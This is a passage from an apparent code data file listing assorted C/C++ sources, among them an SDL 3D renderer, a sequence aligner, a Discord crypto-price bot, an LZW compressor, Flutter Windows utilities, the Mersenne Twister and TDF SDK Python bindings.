cout << \"NO\" << endl;\n    else cout << dis[n] - 1 << endl;\n    // for (int i = 1; i <= n; i++) {\n    //     cout << i << \": \" << dis[i] - 1 << endl;\n    // }\n\n    return 0;\n}",
    "#include \"Renderer3D.h\"\n#include <SDL.h>\n\nRenderer3D::Renderer3D(SDL_Window* _window, SDL_Renderer* renderer, std::vector<Point3D>& _points, std::vector<Edge>& _edges)\n{\n\tSDL_GetWindowSize(_window, &WindowSizeX, &WindowSizeY);\n\tSDL_render = renderer;\n\tpoints = _points;\n\tedges = _edges;\n}\n\nvoid Renderer3D::render()\n{\n\tauto time1 = std::chrono::high_resolution_clock::now();\n\tstd::chrono::duration<double> duration(0);\n\n\tSDL_SetRenderDrawColor(SDL_render, 0, 0, 0, SDL_ALPHA_OPAQUE);\n\tSDL_RenderClear(SDL_render);\n\tSDL_SetRenderDrawColor(SDL_render, 255, 192, 203, SDL_ALPHA_OPAQUE);\n\n\t//rotation += 1 * DeltaTime;\n\n\tfor (auto& edge : edges) {\n\t\tPoint2D start = projection(points[edge.start]);\n\t\tPoint2D end = projection(points[edge.end]);\n\n\t\tSDL_RenderDrawLine(SDL_render, start.x, start.y, end.x, end.y);\n\t}\n\n\tSDL_RenderPresent(SDL_render);\n\n\tauto time2 = std::chrono::high_resolution_clock::now();\n\tduration = time2 - time1;\n\tDeltaTime = duration.count();\n\ttime1 = time2;\n}\n\nPoint2D Renderer3D::projection(Point3D point)\n{\n\treturn Point2D{ WindowSizeX / 2 + (point.x * FL) / (FL + point.z) * 100, WindowSizeY / 2 + (point.y * FL) / (FL + point.z) * 100 };\n}\n",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <fstream>\n#include <utility>\n\nstruct casilla{\n    casilla* left = nullptr, *top=nullptr, *diagonal = nullptr;\n    std::string valor = \"__\";\n    char l,t;\n};\n\nusing tablero = std::vector<casilla>;\nusing alignment = std::vector<std::vector<std::string>>;\nusing std::string;\nusing std::vector;\nusing std::cout;\nusing std::pair;\nusing std::max;\nusing std::stoi;\n\nint match = 1, indel = -2, mismatch = -1;\nvoid iniciarlizarTablero(tablero& tab, unsigned int fsize, unsigned int csize, string c1, string c2);\nvoid imprimirTablero(tablero& tab, unsigned int fsize, unsigned int csize);\nvoid NeddlemanWunsch(tablero& tab, unsigned int fsize, unsigned int csize);\nstd::vector<alignment> findAllAlingments(tablero& tab, unsigned int fsize, unsigned int csize, casilla* temp= nullptr);\nalignment findBestAlignment(tablero& tab, unsigned  int fsize, unsigned  int csize);\nvoid printPathsToFile(vector<alignment>& recorridos);\nvoid printAlignmentsToFile(vector<alignment>& recorridos, unsigned int fsize, unsigned int csize);\nvoid printPathsToFile(alignment& recorrido);\nvoid printAlignmentsToFile(alignment& recorrido, unsigned int fsize, unsigned int csize);\nvoid leerInputs(string& st1, string& st2, string file);\n\nint main() {\n    string cadena1;\n    string cadena2;\n    leerInputs(cadena1,cadena2,\"input.txt\");\n    auto fsize = cadena2.size()+2;\n    auto csize = cadena1.size()+2;\n    tablero tab1((cadena1.size()+2)*(cadena2.size()+2));\n    iniciarlizarTablero(tab1, fsize, csize,cadena1,cadena2);\n    //imprimirTablero(tab1, fsize, csize);\n    NeddlemanWunsch(tab1, fsize, csize);\n    //imprimirTablero(tab1, fsize, csize);\n    //auto rs = findAllAlingments(tab1,fsize,csize);\n    //printPathsToFile(rs);\n    //printAlignmentsToFile(rs,fsize,csize);\n    auto best = findBestAlignment(tab1,fsize,csize);\n    printPathsToFile(best);\n    printAlignmentsToFile(best,fsize,csize);\n}\n\nvoid leerInputs(string& st1, string& st2, string file){\n    std::ifstream input(file);\n    string temp;\n   // std::getline(input,temp);\n    std::getline(input,st1);\n    std::getline(input,st2);\n    input.close();\n}\nvoid printAlignmentsToFile(vector<alignment>& recorridos, unsigned int fsize, unsigned int csize){\n    //int size = std::max((int)fsize,(int)csize);\n    auto size = recorridos[0].size();\n    std::ofstream file(\"alineaciones.txt\");\n    if(!file.is_open()){\n        cout<<\"Error abriendo file de alineaciones\\n\";\n    }\n    else{\n        for(auto& r : recorridos){\n            string t(size,' ');\n            string t2(size,' ');\n            auto indice = size-1;\n            for(auto& c : r){\n                if(c[3] == \"diagonal\"){\n                    t[indice] = c[0][0];\n                    t2[indice] = c[1][0];\n                }else if(c[3] == \"top\"){\n                    t[indice] = c[0][0];\n                    t2[indice] = '-';\n                }else if(c[3] == \"left\"){\n                    t[indice] = '-';\n                    t2[indice] = c[1][0];\n                }else\n                    cout<<\"Error. informaci\u00f3n de casilla indefinida\\n\";\n                indice--;\n            }\n            file << t << \"\\n\";\n            file << t2 << \"\\n\" << \"\\n\";\n        }\n    }\n    file.close();\n}\nvoid printPathsToFile(vector<alignment>& recorridos) {\n    std::ofstream file(\"recorridos.txt\");\n    if(!file.is_open()){\n        cout<<\"Error abriendo file de recorridos\\n\";\n    }\n    else{\n        for(auto& r : recorridos){\n            for(auto& c : r){\n                file << \"{\";\n                for(auto& str : c){\n                    file << str << \", \";\n                }\n                file <<\"}, \";\n            }\n            file << \"\\n\";\n        }\n\n    }\n    file.close();\n}\nvoid printPathsToFile(alignment& recorrido){\n    vector<alignment> vec;\n    vec.push_back(recorrido);\n    printPathsToFile(vec);\n}\nvoid printAlignmentsToFile(alignment& recorrido, unsigned int fsize, unsigned int csize){\n    vector<alignment> vec;\n    vec.push_back(recorrido);\n    printAlignmentsToFile(vec,fsize,csize);\n}\nalignment findBestAlignment(tablero& tab, unsigned  int fsize, unsigned  int csize){\n    alignment  bestAlignment;\n    auto temp = &(tab[csize*(fsize-1)+csize-1]); //inicio (inf. der.)\n    int score = 0;\n    while(!(temp->left == nullptr && temp->top == nullptr && temp->diagonal == nullptr)){\n        if(temp->left != nullptr && temp->top == nullptr && temp->diagonal == nullptr){\n            bestAlignment.push_back({string(1,temp->l),string(1,temp->t),temp->valor, \"left\"}); //x,y,v,dir\n            temp = temp->left; score+= stoi(temp->left->valor);\n        }\n        else if(temp->left == nullptr && temp->top != nullptr && temp->diagonal == nullptr){\n            bestAlignment.push_back({string(1,temp->l),string(1,temp->t),temp->valor, \"top\"}); //x,y,v,dir\n            temp = temp->top; score+= stoi(temp->top->valor);\n        }\n        else if(temp->left == nullptr && temp->top == nullptr && temp->diagonal != nullptr){\n           ",
    "#include \"bot_mgr.h\"\n#include \"coin_mgr.h\"\n\ndpp::cluster bot(\"****************\");//replace with discord bot token\n\nbot_mgr::bot_mgr()\n{\n    bot.on_log(dpp::utility::cout_logger());\n    auto mgr = coin_mgr();\n    \n    /* The interaction create event is fired when someone issues your commands */\n    bot.on_interaction_create([this, &mgr](const dpp::interaction_create_t & event)\n    {\n        auto cmd_name = event.command.get_command_name();\n\n        if (!cmd_name.compare(\"gas\")) this->gas(event, mgr);\n\n        else \n        {\n            if (cmd_name == std::string(\"price\"))\n                cmd_name = std::get<std::string>(event.get_parameter(\"crypto\"));\n\n            std::transform(cmd_name.begin(), cmd_name.end(), cmd_name.begin(), toupper);\n            this->coin(event, cmd_name, mgr);\n        }\n    });\n \n    bot.on_ready([this, &mgr](const dpp::ready_t & event) {\n        if (dpp::run_once<struct register_bot_commands>())\n        {\n            const uint64_t time_to_tick = 300;\n\n            dpp::timer_callback_t callback = [&mgr](dpp::timer)\n            {\n                mgr.tick();\n            };\n\n            if (!setup)\n                bot.start_timer(callback, time_to_tick);\n\n            this->setup_cmds();\n        }\n    });\n\n    bot.start(false);\n}\n\nvoid bot_mgr::setup_cmds()\n{\n    if (!setup)\n    {\n        /* Create a new global command on ready event */\n        dpp::slashcommand btc(\"btc\", \"Get the current Bitcoin price\", bot.me.id);\n        dpp::slashcommand eth(\"eth\", \"Get the current Ethereum price\", bot.me.id);\n        dpp::slashcommand gas(\"gas\", \"Get the current Ethereum gas price\", bot.me.id);\n        dpp::slashcommand shib(\"shib\", \"Get the current Shiba Inu price\", bot.me.id);\n        dpp::slashcommand price(\"price\", \"Get the current price of a cryptocurrency\", bot.me.id);\n\n        price.add_option(dpp::command_option(dpp::co_string, \"crypto\", \"Cryptocurrency\", true));\n\n        /* Register the command */\n        //bot.global_command_create(btc);//Only need to register once\n        //bot.global_command_create(eth);\n        //bot.global_command_create(gas);\n        //bot.global_command_create(shib);\n        //bot.global_command_create(price);\n\n        setup = true;\n    }\n\n}\n\nvoid bot_mgr::gas(const dpp::interaction_create_t& e, coin_mgr& mgr)\n{   \n    auto eth_ticker = std::string(\"eth\");\n\n    if (!mgr.create_coin(eth_ticker)) \n        e.reply(\"Error getting gas\");\n\n    auto fee = mgr.get_fee(eth_ticker);\n    auto price = mgr.get_price(eth_ticker);\n\n    e.reply(fmt::format(std::locale(\"en_US.UTF-8\"), \"Low gas price = {} gwei = ${:.2Lf}\", fee, fee * 0.000021 * price));\n}\n\nvoid bot_mgr::coin(const dpp::interaction_create_t& e, const std::string& coin_ticker, coin_mgr& mgr)\n{\n    auto ticker_lower = coin_ticker;\n    std::transform(coin_ticker.begin(), coin_ticker.end(), ticker_lower.begin(), tolower);\n\n    auto coin_valid = mgr.create_coin(ticker_lower);\n    if (!coin_valid) e.reply(\"Coin is invalid\");\n\n    else\n    {\n        auto price = mgr.get_price(ticker_lower);\n        std::string fmt_string;\n        if (price < 0.1f)\n            fmt_string = fmt::format(std::locale(\"en_US.UTF-8\"), \"1 {} = ${:.9Lf}\", coin_ticker, price);\n        else\n            fmt_string = fmt::format(std::locale(\"en_US.UTF-8\"), \"1 {} = ${:.2Lf}\", coin_ticker, price);\n\n        e.reply(fmt_string);\n    }\n\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <unordered_map>\n#include <string>\n#include <cstdint>\n#include <chrono> \n    // auto start = std::chrono::high_resolution_clock::now();\n    // auto stop = std::chrono::high_resolution_clock::now();\n    // auto duration2 = std::chrono::duration<double, std::milli>(stop-start);\n    // std::cout << \"time while file: \" << duration2.count() << std::endl;\n\n#define MAX_INDEX 32768\n\n// Pass in a copy of index so we don't modify the dict index in case it's used in a future iteration\n// Function flips MSB of index to 1 -> isolate high/low bytes -> swap and combine\nuint16_t byteManipulate(uint16_t value, uint16_t &msb) {\n    value |= msb;\n    uint16_t hi = (value & 0xff00) >> 8;\n    uint16_t lo = value & 0xff;\n    value = (lo << 8) | hi;\n    \n    return value;\n}\n\nint main(int argc, char* argv[]) {\n\n    // Check #no provided args is correct\n    if (argc != 3) {\n        std::cout << \"Please only provide two args: input_file_path & output_file_path\" << std::endl;\n        return 1; \n    }\n\n    // Use (var | MSB) to flip MSB of value to 1; defined once to avoid redundancy\n    uint16_t msb = 0; // 0000\n    msb -= 1; // 1111\n    msb >>= 1; // 0111\n    msb += 1; // 1000\n\n    std::ifstream inFile(argv[1]);\n\n    // Clear this later\n    std::ofstream out;\n    out.open(argv[2], std::ofstream::out | std::ofstream::trunc);\n    out.close();\n    //\n\n    std::ofstream outFile(argv[2], std::ios::binary | std::ios::app);\n\n    // Check files opens correctly\n    if (!inFile || !outFile )\n    {\n        std::cout << \"Unable to open or write to File.\" << std::endl;\n    }\n\n\n    if(inFile.is_open() && outFile.is_open()) {\n\n        char c;\n        std::string p = \"\";\n        std::unordered_map<std::string, uint16_t> codeDict;\n        uint16_t index = 0;\n\n        while(inFile.get(c)) {\n\n            if (index < MAX_INDEX) {\n\n                std::string pc = p + c;\n\n                if (codeDict.find(pc) != codeDict.end() || pc.length() == 1) {\n\n                    p = pc;\n\n                } else {\n\n                    codeDict[pc] = index++;\n\n                    // Output chars if pc is 2 chars or less, else output code\n                    if (p.length() == 1) {\n                        // std::cout << static_cast<char>(p[0]) << std::endl;\n                        outFile.write(reinterpret_cast<const char*>(&p[0]), sizeof(p[0]));                 \n                    } else if (p.length() == 2) {\n                        // std::cout << static_cast<char>(p[0]) << static_cast<char>(p[1]) << std::endl; \n                        outFile.write(reinterpret_cast<const char*>(&p[0]), sizeof(p[0]));                 \n                        outFile.write(reinterpret_cast<const char*>(&p[1]), sizeof(p[1]));\n                    } else {\n                        // std::cout << static_cast<int>(codeDict[p]) << std::endl;\n                        auto trans_index = byteManipulate(codeDict[p],msb);\n                        outFile.write(reinterpret_cast<const char*>(&trans_index), sizeof(trans_index));\n                    }\n\n                    p = c;\n                }\n\n            } else {\n                // If dict is full, ignore LZW algorithm\n                outFile.write(reinterpret_cast<const char*>(&c), sizeof(c));  \n\n            }\n\n        }\n        outFile.write(reinterpret_cast<const char*>(&c), sizeof(c));\n        // think about if c works everytime for last iter\n\n        inFile.close();\n        outFile.close();\n    }\n\n\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include \"equal-paths.h\"\nusing namespace std;\n\n\nNode* a;\nNode* b;\nNode* c;\nNode* d;\nNode* e;\nNode* f;\n\nvoid setNode(Node* n, int key, Node* left=NULL, Node* right=NULL)\n{\n  n->key = key;\n  n->left = left;\n  n->right = right;\n}\n\nvoid test1(const char* msg)\n{\n  setNode(a,1,NULL, NULL);\n  cout << msg << \": \" <<   equalPaths(a) << endl;\n}\n\nvoid test2(const char* msg)\n{\n  setNode(a,1,b,NULL);\n  setNode(b,2,NULL,NULL);\n  cout << msg << \": \" <<   equalPaths(a) << endl;\n}\n\nvoid test3(const char* msg)\n{\n  setNode(a,1,b,c);\n  setNode(b,2,NULL,NULL);\n  setNode(c,3,NULL,NULL);\n  cout << msg << \": \" <<   equalPaths(a) << endl;\n}\n\nvoid test4(const char* msg)\n{\n  setNode(a,1,NULL,c);\n  setNode(c,3,NULL,NULL);\n  cout << msg << \": \" <<   equalPaths(a) << endl;\n}\n\nvoid test5(const char* msg)\n{\n  setNode(a,1,b,c);\n  setNode(b,2,NULL,d);\n  setNode(c,3,NULL,NULL);\n  setNode(d,4,NULL,NULL);\n  cout << msg << \": \" <<   equalPaths(a) << endl;\n}\n\nint main()\n{\n  a = new Node(1);\n  b = new Node(2);\n  c = new Node(3);\n  d = new Node(4);\n\n  test1(\"Test1\");\n  test2(\"Test2\");\n  test3(\"Test3\");\n  test4(\"Test4\");\n  test5(\"Test5\");\n \n  delete a;\n  delete b;\n  delete c;\n  delete d;\n}\n\n",
    "#include<iostream>\n#include<fstream>\nusing namespace std;\n\nclass temp {\n    string id, name, author, search;\n    fstream file;\n    public:\n    void AddBook();\n    void showAll();\n    void ExtractBook();\n}obj;\nint main() {\n    char choice;\n    cout<<\"-----------------------\"<<endl;\n    cout<<\"1. Show All Books\"<<endl;\n    cout<<\"2. Extract Book\"<<endl;\n    cout<<\"3. Add Book(ADMIN)\"<<endl;\n    cout<<\"4. EXIT\"<<endl;\n    cout<<\"-----------------------\"<<endl;\n    cout<<\"\\nEnter Your Choice :: \";\n    cin>>choice;\n\n    switch(choice) {\n        case '1':\n            cin.ignore();\n            obj.showAll();\n        break;\n        case '2':\n            cin.ignore();\n            obj.ExtractBook();\n        break;\n        case '3':\n            cin.ignore();\n            obj.AddBook();\n        break;\n        case '4':\n            return 0;\n        break;\n        default:\n            cout<<\"Invalid choice...\"<<endl;\n    }\n    \n    return 0;\n}\nvoid temp :: AddBook() {\n    cout<<\"\\nEnter your Book ID ::  \"<<endl;\n    getline(cin, id);\n    cout<<\"\\nEnter your Book Name ::  \"<<endl;\n    getline(cin, name);\n    cout<<\"\\nEnter your Book Author ::  \"<<endl;\n    getline(cin, author);\n\n    file.open(\"bookData.txt\", ios :: out | ios :: app);\n    file<<id<<\"*\"<<name<<\"*\"<<author<<endl;\n    file.close();\n}\nvoid temp :: showAll() {\n    file.open(\"bookData.txt\", ios :: in);\n    getline(file,id,'*');\n    getline(file,name,'*');\n    getline(file,author,'\\n');\n    cout<<\"\\n\\n\";\n    cout<<\"\\t\\t Book ID \\t\\t\\t Book Name \\t\\t\\t Author's Name\"<<endl;\n    while (!file.eof())\n    {\n        cout<<\"\\t\\t\"<<id<<\"\\t\\t\\t\"<<name<<\"\\t\\t\\t\"<<author<<endl;\n        getline(file,id,'*');\n        getline(file,name,'*');\n        getline(file,author,'\\n');\n    }\n    file.close();\n}\nvoid temp ::ExtractBook() {\n    showAll();\n    cout<<\"Enter Book ID :: \"<<endl;\n    getline(cin, search);\n\n    file.open(\"bookData.txt\", ios :: in);\n    getline(file,id,'*');\n    getline(file,name,'*');\n    getline(file,author,'\\n');\n    cout<<\"\\n\\n\";\n    cout<<\"\\t\\t\\t Book ID \\t\\t\\t Book Name \\t\\t\\t Author's Name\"<<endl;\n    while (!file.eof())\n    {\n        if(search == id){\n            cout<<\"\\t\\t\\t\"<<id<<\"\\t\\t\\t\"<<name<<\"\\t\\t\\t\"<<author<<endl;\n            cout<<\"Book Extracted successfully...\"<<endl;\n        }\n        getline(file,id,'*');\n        getline(file,name,'*');\n        getline(file,author,'\\n');\n    }\n    file.close(); \n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <stdio.h>\r\n#include \"mt19937ar.h\"\r\n\r\n/* Period parameters */  \r\n#define N 624\r\n#define M 397\r\n#define MATRIX_A 0x9908b0dfUL   /* constant vector a */\r\n#define UPPER_MASK 0x80000000UL /* most significant w-r bits */\r\n#define LOWER_MASK 0x7fffffffUL /* least significant r bits */\r\n\r\nstatic unsigned long mt[N]; /* the array for the state vector  */\r\nstatic int mti=N+1; /* mti==N+1 means mt[N] is not initialized */\r\n\r\n/* initializes mt[N] with a seed */\r\nvoid init_genrand(unsigned long s)\r\n{\r\n    mt[0]= s & 0xffffffffUL;\r\n    for (mti=1; mti<N; mti++) {\r\n        mt[mti] = \r\n\t    (1812433253UL * (mt[mti-1] ^ (mt[mti-1] >> 30)) + mti); \r\n        /* See Knuth TAOCP Vol2. 3rd Ed. P.106 for multiplier. */\r\n        /* In the previous versions, MSBs of the seed affect   */\r\n        /* only MSBs of the array mt[].                        */\r\n        /* 2002/01/09 modified by Makoto Matsumoto             */\r\n        mt[mti] &= 0xffffffffUL;\r\n        /* for >32 bit machines */\r\n    }\r\n}\r\n\r\n/* initialize by an array with array-length */\r\n/* init_key is the array for initializing keys */\r\n/* key_length is its length */\r\n/* slight change for C++, 2004/2/26 */\r\nvoid init_by_array(unsigned long init_key[], int key_length)\r\n{\r\n    int i, j, k;\r\n    init_genrand(19650218UL);\r\n    i=1; j=0;\r\n    k = (N>key_length ? N : key_length);\r\n    for (; k; k--) {\r\n        mt[i] = (mt[i] ^ ((mt[i-1] ^ (mt[i-1] >> 30)) * 1664525UL))\r\n          + init_key[j] + j; /* non linear */\r\n        mt[i] &= 0xffffffffUL; /* for WORDSIZE > 32 machines */\r\n        i++; j++;\r\n        if (i>=N) { mt[0] = mt[N-1]; i=1; }\r\n        if (j>=key_length) j=0;\r\n    }\r\n    for (k=N-1; k; k--) {\r\n        mt[i] = (mt[i] ^ ((mt[i-1] ^ (mt[i-1] >> 30)) * 1566083941UL))\r\n          - i; /* non linear */\r\n        mt[i] &= 0xffffffffUL; /* for WORDSIZE > 32 machines */\r\n        i++;\r\n        if (i>=N) { mt[0] = mt[N-1]; i=1; }\r\n    }\r\n\r\n    mt[0] = 0x80000000UL; /* MSB is 1; assuring non-zero initial array */ \r\n}\r\n\r\n/* generates a random number on [0,0xffffffff]-interval */\r\nunsigned long genrand_int32(void)\r\n{\r\n    unsigned long y;\r\n    static unsigned long mag01[2]={0x0UL, MATRIX_A};\r\n    /* mag01[x] = x * MATRIX_A  for x=0,1 */\r\n\r\n    if (mti >= N) { /* generate N words at one time */\r\n        int kk;\r\n\r\n        if (mti == N+1)   /* if init_genrand() has not been called, */\r\n            init_genrand(5489UL); /* a default initial seed is used */\r\n\r\n        for (kk=0;kk<N-M;kk++) {\r\n            y = (mt[kk]&UPPER_MASK)|(mt[kk+1]&LOWER_MASK);\r\n            mt[kk] = mt[kk+M] ^ (y >> 1) ^ mag01[y & 0x1UL];\r\n        }\r\n        for (;kk<N-1;kk++) {\r\n            y = (mt[kk]&UPPER_MASK)|(mt[kk+1]&LOWER_MASK);\r\n            mt[kk] = mt[kk+(M-N)] ^ (y >> 1) ^ mag01[y & 0x1UL];\r\n        }\r\n        y = (mt[N-1]&UPPER_MASK)|(mt[0]&LOWER_MASK);\r\n        mt[N-1] = mt[M-1] ^ (y >> 1) ^ mag01[y & 0x1UL];\r\n\r\n        mti = 0;\r\n    }\r\n  \r\n    y = mt[mti++];\r\n\r\n    /* Tempering */\r\n    y ^= (y >> 11);\r\n    y ^= (y << 7) & 0x9d2c5680UL;\r\n    y ^= (y << 15) & 0xefc60000UL;\r\n    y ^= (y >> 18);\r\n\r\n    return y;\r\n}\r\n\r\n/* generates a random number on [0,0x7fffffff]-interval */\r\nlong genrand_int31(void)\r\n{\r\n    return (long)(genrand_int32()>>1);\r\n}\r\n\r\n/* generates a random number on [0,1]-real-interval */\r\ndouble genrand_real1(void)\r\n{\r\n    return genrand_int32()*(1.0/4294967295.0); \r\n    /* divided by 2^32-1 */ \r\n}\r\n\r\n/* generates a random number on [0,1)-real-interval */\r\ndouble genrand_real2(void)\r\n{\r\n    return genrand_int32()*(1.0/4294967296.0); \r\n    /* divided by 2^32 */\r\n}\r\n\r\n/* generates a random number on (0,1)-real-interval */\r\ndouble genrand_real3(void)\r\n{\r\n    return (((double)genrand_int32()) + 0.5)*(1.0/4294967296.0); \r\n    /* divided by 2^32 */\r\n}\r\n\r\n/* generates a random number on [0,1) with 53-bit resolution*/\r\ndouble genrand_res53(void) \r\n{ \r\n    unsigned long a=genrand_int32()>>5, b=genrand_int32()>>6; \r\n    return(a*67108864.0+b)*(1.0/9007199254740992.0); \r\n} \r\n/* These real versions are due to Isaku Wada, 2002/01/09 added */\r\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "//\n//  TDF SDK\n//\n//  Created by Sujan Reddy on 2019/03/04.\n//  Copyright 2019 Virtru Corporation\n//\n\n#include <pybind11/pybind11.h>\n#include <pybind11/stl.h>\n#include <sstream>\n\n#include <nanotdf_client.h>\n#include <nanotdf_dataset_client.h>\n#include <tdf_client.h>\n#include <tdf_assertion.h>\n#include <oidc_credentials.h>\n#include <version.h>\n\n#define STRINGIFY(x) #x\nusing namespace pybind11::literals;\n\nPYBIND11_MODULE(opentdf, tdf) {\n\n    using namespace virtru;\n    namespace py = pybind11;\n\n    tdf.doc() = \"Python bindings for the TDF SDK library\";\n\n    // Use the version number from VERSION\n    tdf.attr(\"__version__\") = opentdf_VERSION;\n\n    py::enum_<LogLevel>(tdf, \"LogLevel\")\n        .value(\"Trace\", LogLevel::Trace)\n        .value(\"Debug\", LogLevel::Debug)\n        .value(\"Info\", LogLevel::Info)\n        .value(\"Warn\", LogLevel::Warn)\n        .value(\"Error\", LogLevel::Error)\n        .value(\"Fatal\", LogLevel::Fatal);\n\n    py::enum_<AssertionType>(tdf, \"AssertionType\")\n        .value(\"Handling\", AssertionType::Handling)\n        .value(\"Base\", AssertionType::Base);\n\n    py::enum_<EncryptionState>(tdf, \"EncryptionState\")\n        .value(\"Enable\", EncryptionState::Enable)\n        .value(\"Disable\", EncryptionState::Disable);    \n\n    py::enum_<Scope>(tdf, \"Scope\")\n        .value(\"TDO\", Scope::TDO)\n        .value(\"PAYL\", Scope::PAYL)\n        .value(\"EXPLICIT\", Scope::EXPLICIT)\n        .value(\"Unknown\", Scope::Unknown);\n\n    py::enum_<AppliesToState>(tdf, \"AppliesToState\")\n        .value(\"encrypted\", AppliesToState::encrypted)\n        .value(\"unencrypted\", AppliesToState::unencrypted)\n        .value(\"Unknown\", AppliesToState::Unknown);\n\n    py::enum_<StatementType>(tdf, \"StatementType\")\n        .value(\"ReferenceStatement\", StatementType::ReferenceStatement)\n        .value(\"StructuredStatement\", StatementType::StructuredStatement)\n        .value(\"StringStatement\", StatementType::StringStatement)\n        .value(\"Base64BinaryStatement\", StatementType::Base64BinaryStatement)\n        .value(\"XMLBase64\", StatementType::XMLBase64)\n        .value(\"HandlingStatement\", StatementType::HandlingStatement)\n        .value(\"String\", StatementType::String)\n        .value(\"Unknow\", StatementType::Unknown);\n\n\n    py::class_<StatementGroup>(tdf, \"StatementGroup\")\n        .def(py::init([](StatementType statementType) { \n                return new StatementGroup(statementType);}), R\"pbdoc(\n              Create an statement group\n        )pbdoc\")\n        .def(\"set_statement_type\", &StatementGroup::setStatementType,\n                py::arg(\"statement_type\"), R\"pbdoc(\n                Set the statement type for the statement group\n\n            Args:\n                statement_type(StatementType): The Statement type\n        )pbdoc\")\n        .def(\"set_filename\", &StatementGroup::setFilename,\n                py::arg(\"filename\"), R\"pbdoc(\n                Set the filename for the statement group\n\n            Args:\n                filename(String): The filename\n        )pbdoc\")\n        .def(\"set_media_type\", &StatementGroup::setMediaType,\n                py::arg(\"media_type\"), R\"pbdoc(\n                Set the media type for the statement group\n\n            Args:\n                media_type(String): Media type\n        )pbdoc\")\n        .def(\"set_uri\", &StatementGroup::setUri,\n                py::arg(\"uri\"), R\"pbdoc(\n                Set the uri for the statement group\n\n            Args:\n                uri(String): uri\n        )pbdoc\")\n        .def(\"set_value\", &StatementGroup::setValue,\n                py::arg(\"value\"), R\"pbdoc(\n                Set the value for the statement group\n\n            Args:\n                value(String): Value for the statement group\n        )pbdoc\")\n        .def(\"set_is_encrypted\", &StatementGroup::setIsEncrypted,\n                py::arg(\"is_encrypted\"), R\"pbdoc(\n                Set value for the isEncrypted flag for the statement group\n\n            Args:\n                is_encrypted(bool): is encrypted flag\n        )pbdoc\");\n\n\n    py::class_<Assertion>(tdf, \"Assertion\")\n        .def(py::init([](AssertionType type, Scope scope) { \n                return new Assertion(type, scope);}), R\"pbdoc(\n              Create a default assertion\n\n            Args:\n                type(AssertionType): Assertion type, Handling or Base\n                scope(Scope): Scope of the assertion  \n        )pbdoc\")\n        .def(\"set_id\", &Assertion::setId,\n                py::arg(\"id\"), R\"pbdoc(\n                Set the id for the assertion\n\n            Args:\n                id(String): The assertion id\n        )pbdoc\")\n        .def(\"set_type\", &Assertion::setType,\n                py::arg(\"type\"), R\"pbdoc(\n                Return the type of the assertion\n\n            Args:\n                type(String): The type of the assetion\n        )pbdoc\")\n        .def(\"set_statement_group\", &Assertion::setStatementGroup,\n                py::arg(\"statement_group\"), R\"pbdoc(\n                Set the statement group for the assertion\n\n            Args:\n         ",
